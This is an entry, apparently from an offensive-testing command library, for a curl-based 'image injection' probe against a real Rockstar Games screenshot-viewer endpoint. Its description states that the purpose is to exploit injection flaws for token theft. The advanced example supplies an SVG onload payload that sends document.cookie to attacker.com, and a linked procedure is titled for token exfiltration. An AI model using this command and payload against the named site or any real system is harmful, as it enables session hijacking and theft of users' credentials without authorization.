---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: curl-image-injection-test
type: command
executor: bash
data: >-
  curl -X GET
  "https://www.rockstargames.com/screenshot-viewer/responsive/image?image_url=$1"
  -v
output: null
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:35.882Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web-testing
  - injection
verified: false
validated: true
submitted: true
---

# curl-image-injection-test

## Command

```bash
curl -X GET "https://www.rockstargames.com/screenshot-viewer/responsive/image?image_url=$1" -v
```

## Description

This command tests for image injection vulnerabilities by sending a GET request to the target endpoint with a user-supplied image_url parameter. It uses verbose output (-v) to inspect headers and responses for signs of insecure handling, such as processing without sanitization. Use it to probe and exploit injection flaws leading to token theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$1` (image_url) | The URL or payload to inject as the image source (e.g., malicious.svg) | Yes |
| `-X GET` | Specifies the HTTP method | No (default) |
| `-v` | Enables verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl-image-injection-test "test.jpg"
```

### Advanced Usage

```bash
curl-image-injection-test "\"<svg onload=\"fetch('https://attacker.com?token='+document.cookie)\"/>\""
```

## Expected Output

A verbose HTTP response showing the request and server reply. Successful injection may return processed content without errors, or trigger external requests; look for 200 OK with unsanitized payload echoes.

## Related

- [[Related Procedure|procedures/Exploit-Image-Injection-for-Token-Exfiltration]]
